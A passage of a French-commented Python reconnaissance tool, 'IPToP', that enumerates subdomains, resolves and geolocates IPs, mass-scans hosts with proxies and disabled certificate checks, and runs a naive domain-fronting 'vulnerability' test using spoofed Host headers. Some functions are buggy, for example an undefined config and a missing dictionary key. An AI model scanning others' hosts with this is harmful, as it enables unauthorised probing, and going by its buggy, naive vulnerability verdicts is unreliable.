                            geo_ipinfo = get_geo_info_ipinfo(ip)
                            if geo_ipinfo:
                                f.write("\n[Géolocalisation ipinfo.io]\n")
                                f.write(f"Ville: {geo_ipinfo.get('city', 'N/A')}\n")
                                f.write(f"Région: {geo_ipinfo.get('region', 'N/A')}\n")
                                f.write(f"Pays: {geo_ipinfo.get('country', 'N/A')}\n")
                                f.write(f"Localisation: {geo_ipinfo.get('loc', 'N/A')}\n")
                            
                            geo_ipapi = get_geo_info_ipapi(ip)
                            if geo_ipapi:
                                f.write("\n[Géolocalisation ip-api.com]\n")
                                f.write(f"Ville: {geo_ipapi.get('city', 'N/A')}\n")
                                f.write(f"Région: {geo_ipapi.get('regionName', 'N/A')}\n")
                                f.write(f"Pays: {geo_ipapi.get('country', 'N/A')}\n")
                                f.write(f"Code postal: {geo_ipapi.get('zip', 'N/A')}\n")
                                f.write(f"Coordonnées: {geo_ipapi.get('lat', 'N/A')},{geo_ipapi.get('lon', 'N/A')}\n")
                            
                            # Détection du fournisseur
                            hosting_provider = None
                            if asn_info:
                                for key in ['org', 'isp']:
                                    val = asn_info.get(key)
                                    if val:
                                        hosting_provider = detect_provider(val)
                                        if hosting_provider:
                                            break
                            
                            if hosting_provider:
                                f.write(f"\n[Fournisseur] {hosting_provider}\n")
                            
                            f.write("\n" + "="*50 + "\n")
                
                print(Fore.GREEN + f"\nRésultats sauvegardés dans {output_file}")
            else:
                print(Fore.RED + "Fichier introuvable ou vide.")

        elif choix == "0":
            break

        else:
            print(Fore.RED + "❌ Choix invalide.")

def test_domain_fronting_menu():
    """Menu pour tester la vulnérabilité Domain Fronting"""
    console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
    providers = {
        "1": {"name": "☁️ CloudFront (AWS)", "key": "cloudfront"},
        "2": {"name": "⚡ Fastly", "key": "fastly"},
        "3": {"name": "🌐 Google Cloud", "key": "google"},
        "4": {"name": "🛡️ Azure Front Door", "key": "azure"},
        "5": {"name": "⛈️ Cloudflare", "key": "cloudflare"},
        "6": {"name": "📦 Akamai", "key": "akamai"},
        "7": {"name": "🔒 Imperva", "key": "imperva"},
        "8": {"name": "🦊 BunnyCDN", "key": "bunny"},
        "9": {"name": "🌍 StackPath", "key": "stackpath"},
        "10": {"name": "🚀 G-Core Labs", "key": "gcore"},
        "11": {"name": "🌈 Sucuri", "key": "sucuri"},
        "12": {"name": "☁️ DigitalOcean", "key": "digitalocean"},
        "13": {"name": "📊 Tous les fournisseurs", "key": "all"},
        "14": {"name": "📁 Tester depuis un fichier", "key": "file"}
    }

    while True:
        print(Fore.LIGHTBLUE_EX + "\n=== TEST DE DOMAIN FRONTING ===")
        for num, provider in providers.items():
            print(Fore.CYAN + f" {num}. {provider['name']}")
        print(Fore.CYAN + " 0. Retour")

        choix = input(Fore.YELLOW + "\n>>> Choisissez une option (0-14) : ").strip()

        if choix == "0":
            break
        elif choix == "14":
            test_from_file()
        elif choix in providers:
            if choix == "13":  # Tous les fournisseurs
                selected_providers = [p["key"] for p in providers.values() 
                                    if p["key"] not in ("all", "file")]
                target = input(Fore.YELLOW + "Entrez le domaine ou IP à tester : ").strip()
                if target:
                    for provider in selected_providers:
                        test_domain_fronting(target, provider)
            else:
                target = input(Fore.YELLOW + "Entrez le domaine ou IP à tester : ").strip()
                if target:
                    test_domain_fronting(target, providers[choix]["key"])
        else:
            print(Fore.RED + "❌ Option invalide.")

def test_from_file():
    """Version robuste du test par fichier"""
    print(Fore.CYAN + "\n=== TEST PAR FICHIER ===")
    
    try:
        file_path = input(Fore.YELLOW + "Chemin du fichier (1 cible par ligne): ").strip()
        if not file_path:
            raise ValueError("Chemin vide")

        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Fichier introuvable: {file_path}")

        # Choix des fournisseurs
        providers = {
            "1": "cloudfront",
            "2": "fastly",
            "3": "google",
            "4": "azure",
            "5": "cloudflare",
            "6": "akamai",
            "7": "imperva",
            "8": "bunny",
            "9": "stackpath",
            "10": "gcore",
            "11": "sucuri",
            "12": "digitalocean",
            "13": "all"
        }
        
        console.print("\n[bold white]===[ IPToP ]===\n[/bold white]")
        print(Fore.CYAN + "\nChoisissez les fournisseurs à tester :")
        print(Fore.CYAN + " 1. CloudFront (AWS)")
        print(Fore.CYAN + " 2. Fastly")
        print(Fore.CYAN + " 3. Google Cloud")
        print(Fore.CYAN + " 4. Azure Front Door")
        print(Fore.CYAN + " 5. Cloudflare")
        print(Fore.CYAN + " 6. Akamai")
        print(Fore.CYAN + " 7. Imperva")
        print(Fore.CYAN + " 8. BunnyCDN")
        print(Fore.CYAN + " 9. StackPath")
        print(Fore.CYAN + "10. G-Core Labs")
        print(Fore.CYAN + "11. Sucuri")
        print(Fore.CYAN + "12. DigitalOcean")
        print(Fore.CYAN + "13. Tous les fournisseurs")
        
        provider_choice = input(Fore.YELLOW + "\n>>> Sélection (numéros séparés par des virgules ou 'all') : ").strip()
        
        selected_providers = []
        if provider_choice.lower() == "all":
            selected_providers = list(providers.values())[:-1]  # Exclure "all"
        else:
            for num in provider_choice.split(","):
                num = num.strip()
                if num in providers:
                    if num == "13":
                        selected_providers.extend(list(providers.values())[:-1])
                    else:
                        selected_providers.append(providers[num])
        
        if not selected_providers:
            print(Fore.RED + "❌ Aucun fournisseur sélectionné")
            return

        # Lecture et validation des cibles
        valid_targets = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line_number, line in enumerate(f, 1):
                line = line.strip()
                if line and is_valid_target(line):
                    valid_targets.append(line)
                else:
                    print(Fore.YELLOW + f"⚠️ Ligne {line_number} ignorée: {line[:50]}...")

        if not valid_targets:
            print(Fore.RED + "❌ Aucune cible valide trouvée")
            return

        # Confirmation
        print(Fore.CYAN + f"\n🔍 {len(valid_targets)} cibles valides trouvées")
        print(Fore.CYAN + f"🔧 {len(selected_providers)} fournisseurs sélectionnés")
        confirm = input(Fore.YELLOW + "Lancer le scan ? (o/n): ").lower()
        if confirm != 'o':
            return

        # Exécution
        results = []
        for target in valid_targets:
            for provider in selected_providers:
                try:
                    print(Fore.MAGENTA + f"\n🔎 Test: {target} [{provider.upper()}]")
                    vulnerable = test_domain_fronting(target, provider, silent=False)
                    results.append({
                        "target": target,
                        "provider": provider,
                        "status": "VULNÉRABLE" if vulnerable else "SÉCURISÉ"
                    })
                except Exception as e:
                    print(Fore.RED + f"❌ Erreur avec {target}: {str(e)}")
                    results.append({
                        "target": target,
                        "provider": provider,
                        "status": "ERREUR"
                    })

        generate_report(results, file_path)

    except Exception as e:
        print(Fore.RED + f"❌ Erreur critique: {str(e)}")
        traceback.print_exc()
    
def generate_report(results, source_file):
    """Génère un rapport complet des tests"""
    if not results:
        return

    report_dir = "domain_fronting_reports"
    os.makedirs(report_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"{report_dir}/report_{os.path.basename(source_file)}_{timestamp}.csv"
    
    # En-tête CSV
    csv_header = "Cible,Fournisseur,Statut,Date\n"
    
    # Données CSV
    csv_data = ""
    for result in results:
        csv_data += f"{result['target']},{result['provider']},{result['status']},{timestamp}\n"
    
    # Écrire le fichier
    with open(report_file, 'w') as f:
        f.write(csv_header)
        f.write(csv_data)
    
    # Statistiques
    total_tests = len(results)
    vulnerable = sum(1 for r in results if r['vulnerable'])
    secured = sum(1 for r in results if r['status'] == "SÉCURISÉ")
    errors = sum(1 for r in results if r['status'] == "ERREUR")
    
    console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
    print(Fore.GREEN + "\n=== RAPPORT FINAL ===")
    print(Fore.CYAN + f"📊 Total tests : {total_tests}")
    print(Fore.RED + f"⚠️ Vulnérables : {vulnerable}")
    print(Fore.GREEN + f"✅ Sécurisés : {secured}")
    print(Fore.YELLOW + f"❌ Erreurs : {errors}")
    print(Fore.BLUE + f"📁 Rapport sauvegardé : {report_file}")

def is_valid_target(target):
    """Valide les domaines et adresses IP de manière robuste"""
    if not target or not isinstance(target, str):
        return False
    
    # Nettoyage de la cible
    clean_target = target.split('://')[-1].split('/')[0].split('?')[0]
    
    # Validation IPv4
    ipv4_regex = r'^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    
    # Validation Domaine (support IDN)
    domain_regex = r'^([a-z0-9-]+\.)+[a-z]{2,}$'
    
    return bool(re.match(ipv4_regex, clean_target)) or bool(re.match(domain_regex, clean_target, re.IGNORECASE))

def test_domain_fronting(target, provider, silent=True):
    """Teste Domain Fronting avec gestion robuste des erreurs"""
    if not is_valid_target(target):
        if not silent:
            print(Fore.RED + "❌ Cible invalide - Format attendu : domaine.com ou 1.2.3.4")
        return False

    config = {
        "cloudfront": {
            "host": "d111111abcdef8.cloudfront.net",
            "headers": {"Host": "d111111abcdef8.cloudfront.net"},
            "indicators": ["x-amz-cf-pop", "x-amz-cf-id", "via"]
        },
        "fastly": {
            "host": "global.ssl.fastly.net",
            "headers": {"Host": "global.ssl.fastly.net"},
            "indicators": ["fastly-debug-digest", "x-fastly-request-id"]
        },
        "google": {
            "host": "www.google.com",
            "headers": {"Host": "www.google.com"},
            "indicators": ["x-guploader-uploadid", "server"]
        },
        "azure": {
            "host": "azureedge.net",
            "headers": {"Host": "azureedge.net"},
            "indicators": ["x-azure-ref", "x-azure-originatingip"]
        },
        "cloudflare": {
            "host": "cdn.cloudflare.net",
            "headers": {"Host": "cdn.cloudflare.net"},
            "indicators": ["cf-ray", "server", "cf-cache-status"]
        },
        "akamai": {
            "host": "akamaihd.net",
            "headers": {"Host": "akamaihd.net"},
            "indicators": ["x-akamai-request-id", "x-akamai-transformed"]
        },
        "imperva": {
            "host": "impervadns.net",
            "headers": {"Host": "impervadns.net"},
            "indicators": ["x-cdn", "incap-sid", "x-iinfo"]
        },
        "bunny": {
            "host": "b-cdn.net",
            "headers": {"Host": "b-cdn.net"},
            "indicators": ["x-bunny-server", "x-bunny-cache"]
        },
        "stackpath": {
            "host": "stackpathdns.com",
            "headers": {"Host": "stackpathdns.com"},
            "indicators": ["x-sp-request-id", "server"]
        },
        "gcore": {
            "host": "gcdn.co",
            "headers": {"Host": "gcdn.co"},
            "indicators": ["x-edge-location", "x-request-id"]
        },
        "sucuri": {
            "host": "sucuridns.net",
            "headers": {"Host": "sucuridns.net"},
            "indicators": ["x-sucuri-id", "x-sucuri-cache"]
        },
        "digitalocean": {
            "host": "digitaloceanspaces.com",
            "headers": {"Host": "digitaloceanspaces.com"},
            "indicators": ["x-amz-request-id", "server"]
        }
    }

    try:
        # Configuration requête
        url = f"http://{target}" if not target.startswith(('http://', 'https://')) else target
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-Language": "fr-FR,fr;q=0.9",
            **config[provider]["headers"]
        }

        # Timeout différencié (connexion: 5s, lecture: 20s)
        response = requests.get(
            url,
            headers=headers,
            timeout=(5, 20),
            verify=False,
            allow_redirects=False
        )

        # Analyse insensible à la casse
        response_headers = {k.lower(): v for k, v in response.headers.items()}
        vulnerable = any(
            ind.lower() in response_headers
            for ind in config[provider]["indicators"]
        )

        # Affichage détaillé
        if not silent:
            print(Fore.CYAN + f"\n=== Résultats {target} ===")
            print(f"HTTP {response.status_code} | Taille: {len(response.text)} chars")
            print(f"Headers reçus ({len(response.headers)}):")
            
            for header, value in response.headers.items():
                color = Fore.RED if any(h.lower() in header.lower() for h in config[provider]["indicators"]) else Fore.WHITE
                print(f"  {color}{header}: {value}{Style.RESET_ALL}")

            print(Fore.RED + "VULNÉRABLE" if vulnerable else Fore.GREEN + "SÉCURISÉ")

        save_to_log(target, provider, response, vulnerable)
        return vulnerable

    except requests.exceptions.SSLError:
        if not silent:
            print(Fore.RED + "❌ Erreur SSL - Essayez avec HTTP ou vérifiez le certificat")
        return False
    except requests.exceptions.Timeout:
        if not silent:
            print(Fore.RED + "❌ Timeout - Le serveur ne répond pas")
        return False
    except requests.exceptions.RequestException as e:
        if not silent:
            print(Fore.RED + f"❌ Erreur réseau: {type(e).__name__}")
        return False
    except Exception as e:
        if not silent:
            print(Fore.RED + f"❌ Erreur inattendue: {str(e)}")
            traceback.print_exc()
        return False
        
def save_to_log(target, provider, response, vulnerable):
    """Sauvegarde les résultats dans un fichier log"""
    log_dir = "domain_fronting_logs"
    os.makedirs(log_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{log_dir}/{target.replace('.', '_')}_{provider}_{timestamp}.log"
    
    with open(filename, 'w') as f:
        f.write(f"=== Test Domain Fronting ===\n")
        f.write(f"Date: {datetime.now()}\n")
        f.write(f"Cible: {target}\n")
        f.write(f"Fournisseur: {provider}\n")
        f.write(f"Vulnérable: {'OUI' if vulnerable else 'NON'}\n\n")
        
        f.write("=== Réponse HTTP ===\n")
        f.write(f"Status: {response.status_code}\n")
        f.write("Headers:\n")
        for k, v in response.headers.items():
            f.write(f"  {k}: {v}\n")
        
        if vulnerable:
            f.write("\n=== Détails de vulnérabilité ===\n")
            provider_config = config.get(provider)
            if provider_config:
                for ind in provider_config["indicators"]:
                    if ind in response.headers:
                        f.write(f"  {ind}: {response.headers[ind]}\n")
    
    print(Fore.BLUE + f"\n📁 Résultats sauvegardés dans {filename}")
    
def print_header(title):
    print("\n" + Fore.CYAN + "="*len(title))
    print(Fore.CYAN + title)
    print(Fore.CYAN + "="*len(title))

def get_ip(domain_or_ip):
    try:
        socket.inet_aton(domain_or_ip)
        return domain_or_ip
    except socket.error:
        try:
            return socket.gethostbyname(domain_or_ip)
        except Exception as e:
            print(Fore.RED + f"[Erreur DNS] {e}")
            return None

def get_asn_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=as,org,isp,status,message")
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return data
            else:
                print(Fore.RED + f"[Erreur ASN API] {data.get('message')}")
                return None
        else:
            print(Fore.RED + f"[Erreur API ASN] Code {response.status_code}")
            return None
    except Exception as e:
        print(Fore.RED + f"[Erreur requête ASN API] {e}")
        return None

def get_geo_info_ipinfo(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            return response.json()
        else:
            print(Fore.RED + f"[Erreur API ipinfo.io] Code : {response.status_code}")
            return None
    except Exception as e:
        print(Fore.RED + f"[Erreur requête API ipinfo.io] {e}")
        return None

def get_geo_info_ipapi(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return data
            else:
                print(Fore.RED + f"[Erreur ip-api.com] Message : {data.get('message')}")
                return None
        else:
            print(Fore.RED + f"[Erreur API ip-api.com] Code : {response.status_code}")
            return None
    except Exception as e:
        print(Fore.RED + f"[Erreur requête API ip-api.com] {e}")
        return None

def detect_provider(provider_str):
    provider_str = provider_str.lower()
    providers = {
        "google": "Google Cloud Platform",
        "amazon": "Amazon Web Services (AWS)",
        "aws": "Amazon Web Services (AWS)",
        "ovh": "OVH",
        "scaleway": "Scaleway",
        "digitalocean": "DigitalOcean",
        "microsoft": "Microsoft Azure",
        "azure": "Microsoft Azure",
        "linode": "Linode",
        "cloudflare": "Cloudflare",
        "hetzner": "Hetzner",
    }
    for key, name in providers.items():
        if key in provider_str:
            return name
    return None

def is_valid_domain(domain):
    """Valide strictement un nom de domaine"""
    if not domain or '*' in domain:
        return False
    
    # Vérifie la longueur totale
    if len(domain) > 253:
        return False
    
    # Vérifie chaque partie
    parts = domain.split('.')
    if len(parts) < 2:  # Au moins un sous-domaine et un TLD
        return False
    
    for part in parts:
        if not part or len(part) > 63:
            return False
        if not re.match(r'^[a-z0-9-]+$', part):
            return False
        if part.startswith('-') or part.endswith('-'):
            return False
    
    return True

def get_domains_from_hackertarget(domain, proxy=None):
    import requests
    url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
    try:
        resp = requests.get(url, timeout=10, proxies={"http": proxy, "https": proxy} if proxy else None)
        lines = resp.text.splitlines()
        domains = [line.split(',')[0].strip() for line in lines if ',' in line]
        return list(set(domains))
    except Exception as e:
        print(Fore.RED + f"❌ Hackertarget erreur: {e}")
        return []
        
def get_domains_from_crtsh(domain, proxy=None):
    import requests
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        resp = requests.get(url, timeout=15, proxies={"http": proxy, "https": proxy} if proxy else None)
        entries = resp.json()
        raw_domains = [entry['name_value'] for entry in entries if 'name_value' in entry]
        all_domains = set()
        for item in raw_domains:
            for d in item.split('\n'):
                if domain in d:
                    all_domains.add(d.strip())
        return list(all_domains)
    except Exception as e:
        print(Fore.RED + f"❌ crt.sh erreur: {e}")
        return []
        
def get_domains_from_subfinder(domain, proxy=None):
    try:
        env = os.environ.copy()
        if proxy:
            env["http_proxy"] = proxy
            env["https_proxy"] = proxy

        result = subprocess.run(
            ['subfinder', '-d', domain, '-silent'],
            capture_output=True,
            text=True,
            timeout=60,
            env=env
        )
        domains = result.stdout.splitlines()
        return list(set(domains))
    except Exception as e:
        print(Fore.RED + f"❌ Subfinder erreur: {e}")
        return []

def get_domains_from_sublist3r(domain, proxy=None):
    try:
        with tempfile.NamedTemporaryFile(delete=False, mode='w+', suffix='.txt') as tmpfile:
            output_path = tmpfile.name

        env = os.environ.copy()
        if proxy:
            env['http_proxy'] = proxy
            env['https_proxy'] = proxy

        result = subprocess.run(
            ['sublist3r', '-d', domain, '-o', output_path],
            capture_output=True,
            text=True,
            timeout=180,
            env=env
        )

        if result.returncode != 0:
            print(Fore.RED + f"❌ Sublist3r erreur: {result.stderr}")
            return []

        with open(output_path, 'r') as f:
            domains = list(set(line.strip() for line in f if line.strip()))

        os.remove(output_path)
        return domains

    except Exception as e:
        print(Fore.RED + f"❌ Sublist3r erreur: {e}")
        return []

def find_domains(domain, proxy=None, turbo=False):
    """Version finale intégrant votre fonction de recherche"""
    domain_file = f"{domain}_domains.txt"
    ip_file = f"{domain}_ips.txt"

    # Initialisation
    print(Fore.BLUE + f"\n➡ Target: {domain}")
    if proxy:
        print(Fore.BLUE + f"➡ Proxy: {proxy}")
    if turbo:
        print(Fore.MAGENTA + "⚡ Mode TURBO activé")

    # 1. Chargement des domaines
    valid_domains = load_or_search_domains(domain, domain_file, proxy)
    if not valid_domains:
        return

    # 2. Menu interactif
    while True:
        console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
        print(Fore.CYAN + "\n" + "═"*50)
        print(f"Domaines actifs: {len(valid_domains)} | IPs résolues: {file_line_count(ip_file)}")
        print(Fore.CYAN + "1. Résoudre les domaines en IPs")
        print("2. Scanner les IPs résolues")
        print("3. Scanner les sous-domaines")
        print("0. Sauvegarder et quitter")
        
        choice = input(Fore.YELLOW + ">>> Choix (1-3) : ").strip()

        if choice == "1":
            resolve_domains_interactive(valid_domains, ip_file, proxy)
            
        elif choice == "2":
            if os.path.exists(ip_file):
                scan_ips_interactive(ip_file)
            else:
                print(Fore.RED + "❌ Aucun fichier d'IPs trouvé")

        elif choice == "3":
            if os.path.exists(domain_file):
                print(Fore.CYAN + f"\nOptions de scan pour {domain_file}:")
                print("1. Scanner les domaines (HTTP/HTTPS)")
                print("2. Scanner les IPs associées")
                print("0. Retour")
                
                scan_choice = input(Fore.YELLOW + ">>> Choix (1-3) : ").strip()
                
                if scan_choice == "1":
                    scan_domains_interactive(domain_file)  # Nouvelle fonction de scan
                elif scan_choice == "2":
                    # Résolution DNS puis scan IP
                    if input("Résoudre les domaines en IPs d'abord ? (o/n) ").lower() == 'o':
                        resolve_domains_interactive(load_domains(domain_file), ip_file, proxy)
                    scan_ips_interactive(ip_file)
                elif scan_choice == "0":
                    continue
                else:
                    print(Fore.RED + "Option invalide")
            else:
                print(Fore.RED + f"❌ Fichier {domain_file} introuvable")
                
        elif choice == "0":
            save_domains(valid_domains, domain_file)
            break

        else:
            print(Fore.RED + "❌ Option invalide")

# ================= VOTRE FONCTION SPÉCIFIQUE =================
def search_and_save_domains(domain, output_file, proxy=None):
    """Effectue les recherches passives et sauvegarde les domaines trouvés"""
    sources = ["Hackertarget", "crt.sh", "Subfinder", "Sublist3r"]
    display_loading_box("🔍 Recherche passive en cours", sources)

    stop_spinner = threading.Event()
    spinner_thread = threading.Thread(target=animate_spinner, args=("Recherche...", stop_spinner))
    spinner_thread.start()

    results = {
        "Hackertarget": get_domains_from_hackertarget(domain, proxy),
        "crt.sh": get_domains_from_crtsh(domain, proxy),
        "Subfinder": get_domains_from_subfinder(domain),
        "Sublist3r": get_domains_from_sublist3r(domain)
    }

    stop_spinner.set()
    spinner_thread.join()

    all_domains = set()
    for src, lst in results.items():
        print(Fore.CYAN + f"▪ Tentative avec {src}..." + Fore.GREEN + f"✓ {len(lst)} domaines valides")
        all_domains.update(lst)

    print(Fore.GREEN + f"\n✅ Total de domaines valides: {len(all_domains)}")

    with open(output_file, 'w') as f:
        for d in sorted(all_domains):
            f.write(d + "\n")

    print(Fore.GREEN + f"✓ Résultats sauvegardés dans {output_file}")
    return all_domains

# ================= FONCTIONS SUPPORT =================
def load_or_search_domains(domain, domain_file, proxy):
    """Charge ou recherche les domaines"""
    if os.path.exists(domain_file):
        reuse = input(Fore.YELLOW + f"\nFichier {domain_file} existant. Réutiliser ? (o/n) : ").lower()
        if reuse == 'o':
            with open(domain_file, 'r') as f:
                domains = {line.strip() for line in f if line.strip()}
                print(Fore.GREEN + f"✓ {len(domains)} domaines chargés")
                return domains
    
    return search_and_save_domains(domain, domain_file, proxy)

def file_line_count(filename):
    """Compte les lignes d'un fichier"""
    try:
        with open(filename, 'r') as f:
            return sum(1 for _ in f)
    except:
        return 0

def resolve_domains_interactive(domains, ip_file, proxy):
    """Résolution DNS interactive"""
    console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
    print(Fore.CYAN + "\nMéthode de résolution :")
    print("1. Standard (DNS local)")
    print("2. DNS over HTTPS (Cloudflare)")
    print("3. DNS over HTTPS (Google)")
    
    mode = input(Fore.YELLOW + ">>> Choix (1-3) : ").strip()
    resolver = {
        '1': resolve_standard,
        '2': lambda d: resolve_doh(d, 'cloudflare', proxy),
        '3': lambda d: resolve_doh(d, 'google', proxy)
    }.get(mode, resolve_standard)

    ips = set()
    with tqdm(domains, desc="Résolution DNS") as pbar:
        for domain in pbar:
            if ip := resolver(domain):
                ips.add(ip)
                pbar.set_postfix_str(ip)
    
    with open(ip_file, 'w') as f:
        f.writelines(f"{ip}\n" for ip in sorted(ips))
    print(Fore.GREEN + f"✓ {len(ips)} IPs sauvegardées dans {ip_file}")

def scan_ips_interactive(ip_file):
    """Version optimisée utilisant fast_check_host"""
    try:
        # Configuration
        threads = get_valid_threads()
        proxy = get_proxy_config()
        
        # Lecture des IPs
        with open(ip_file, 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
        
        if not ips:
            print(Fore.RED + "❌ Aucune IP valide à scanner")
            return

        # Lancement du scan
        print(Fore.CYAN + f"\n⚡ Scan de {len(ips)} IPs avec {threads} threads...")
        active_hosts = []
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(fast_check_host, ip, proxy): ip 
                for ip in ips
            }
            
            with tqdm(total=len(ips), desc="Progression") as pbar:
                for future in as_completed(futures):
                    ip, status = future.result()
                    if status == "up":
                        active_hosts.append(ip)
                    pbar.update(1)

        # Sauvegarde des résultats
        if active_hosts:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_file = f"active_hosts_{timestamp}.txt"
            with open(result_file, 'w') as f:
                f.write("\n".join(active_hosts))
            print(Fore.GREEN + f"\n✔ {len(active_hosts)} hôtes actifs trouvés")
            print(Fore.GREEN + f"✓ Résultats sauvegardés dans {result_file}")
        else:
            print(Fore.RED + "\n❌ Aucun hôte actif trouvé")

    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur lors du scan: {str(e)}")

def fast_check_host(ip, proxy=None, timeout=2):
    """
    Version simplifiée pour les scans massifs d'IPs
    À utiliser avec ThreadPoolExecutor dans scan_ips_interactive()
    """
    try:
        # Test ping (prioritaire pour les IPs)
        if ping(ip, timeout=1):
            return (ip, "up")
        
        # Test HTTP/HTTPS si ping échoue
        for scheme in ['http', 'https']:
            try:
                url = f"{scheme}://{ip}"
                response = requests.get(
                    url,
                    timeout=timeout,
                    proxies={"http": proxy, "https": proxy} if proxy else None,
                    verify=False,
                    allow_redirects=False
                )
                if response.status_code < 400:
                    return (ip, "up")
            except:
                continue
                
        return (ip, "down")
    except:
        return (ip, "error")

def scan_domains_interactive(domain_file):
    """Version améliorée du scan de sous-domaines avec détection avancée"""
    try:
        # Configuration
        threads = get_valid_threads()
        proxy = get_proxy_config()
        timeout = 5  # Timeout en secondes
        
        # Lecture des domaines
        with open(domain_file, 'r') as f:
            domains = list({line.strip() for line in f if line.strip()})
        
        if not domains:
            print(Fore.RED + "❌ Aucun domaine valide à scanner")
            return

        print(Fore.CYAN + f"\n⚡ Scan de {len(domains)} domaines avec {threads} threads...")
        print(Fore.YELLOW + "ℹ CTRL+C pour interrompre le scan\n")
        
        active_domains = []
        lock = threading.Lock()  # Pour l'affichage thread-safe

        def process_result(domain, status, details):
            """Gère l'affichage et le stockage des résultats"""
            nonlocal active_domains
            if status == "up":
                with lock:
                    entry = f"{domain.ljust(40)} {details}"
                    active_domains.append(entry)
                    print(Fore.GREEN + f"✅ {entry}")
            elif status == "error":
                with lock:
                    print(Fore.RED + f"❌ {domain.ljust(40)} Erreur: {details}")

        # Lancement du scan
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_domain_advanced, domain, proxy, timeout): domain 
                      for domain in domains}
            
            try:
                with tqdm(total=len(domains), desc="Progression", unit="domaine") as pbar:
                    for future in as_completed(futures):
                        domain, status, details = future.result()
                        process_result(domain, status, details)
                        pbar.update(1)
                        
            except KeyboardInterrupt:
                print(Fore.RED + "\n⚠ Scan interrompu par l'utilisateur")
                executor.shutdown(wait=False)
                for future in futures:
                    future.cancel()
                raise

        # Sauvegarde et rapport
        if active_domains:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_file = f"active_domains_{timestamp}.txt"
            
            with open(result_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(active_domains))
            
            print(Fore.CYAN + "\n═"*50)
            print(Fore.GREEN + f"✔ {len(active_domains)} DOMAINES ACTIFS TROUVÉS :")
            for entry in active_domains:
                print(Fore.GREEN + f"• {entry}")
            print(Fore.CYAN + "═"*50)
            print(Fore.GREEN + f"✓ Résultats sauvegardés dans {result_file}")
        else:
            print(Fore.RED + "\n❌ Aucun domaine actif trouvé")

    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur critique lors du scan: {str(e)}")


def check_domain_advanced(domain, proxy=None, timeout=5):
    """Vérification avancée avec plusieurs méthodes de détection"""
    try:
        # 1. Vérification DNS de base
        try:
            socket.gethostbyname(domain)
        except socket.gaierror:
            return (domain, "down", "DNS introuvable")

        # 2. Test HTTP/HTTPS
        schemes = ['https://', 'http://']
        for scheme in schemes:
            try:
                url = scheme + domain
                response = requests.get(
                    url,
                    timeout=timeout,
                    proxies={"http": proxy, "https": proxy} if proxy else None,
                    verify=False,
                    allow_redirects=True,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                    }
                )
                
                # Codes considérés comme valides
                if response.status_code < 500:  # Inclut les 4xx sauf 429
                    server = response.headers.get('Server', '')
                    via = response.headers.get('Via', '')
                    powered_by = response.headers.get('X-Powered-By', '')
                    
                    details = [
                        f"HTTP {response.status_code}",
                        f"Server: {server}" if server else "",
                        f"Via: {via}" if via else "",
                        f"PoweredBy: {powered_by}" if powered_by else ""
                    ]
                    return (domain, "up", " | ".join(filter(None, details)))
                    
            except requests.exceptions.SSLError:
                return (domain, "up", "SSL Valide (certificat non vérifié)")
            except requests.exceptions.ConnectionError:
                continue
            except requests.exceptions.ReadTimeout:
                continue
            except requests.exceptions.TooManyRedirects:
                return (domain, "up", "Redirections multiples")
            except Exception:
                continue

        # 3. Test des ports alternatifs
        open_ports = check_open_ports(domain)
        if open_ports:
            return (domain, "up", f"Ports ouverts: {', '.join(map(str, open_ports))}")

        return (domain, "down", "Aucune réponse valide")

    except Exception as e:
        return (domain, "error", f"Erreur: {str(e)}")


def check_open_ports(hostname, ports=[80, 443, 8080, 8443, 8888], timeout=2):
    """Détecte les ports ouverts"""
    open_ports = []
    for port in ports:
        try:
            with socket.create_connection((hostname, port), timeout=timeout):
                open_ports.append(port)
        except:
            continue
    return open_ports

def check_domain(domain, proxy=None, timeout=5):
    """Version robuste avec plus de vérifications"""
    schemes = ['https://', 'http://']
    for scheme in schemes:
        try:
            url = scheme + domain
            response = requests.get(
                url,
                timeout=timeout,
                proxies={"http": proxy, "https": proxy} if proxy else None,
                verify=False,
                allow_redirects=True,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            )
            
            # Détection plus intelligente des réponses valides
            if response.status_code < 400 or response.status_code in [401, 403]:
                server = response.headers.get('Server', 'Inconnu')
                return (domain, "up", f"{response.status_code} - {server}")
            
        except requests.exceptions.SSLError:
            return (domain, "up", "SSL Valide (erreur ignorée)")
        except requests.exceptions.ConnectionError:
            continue
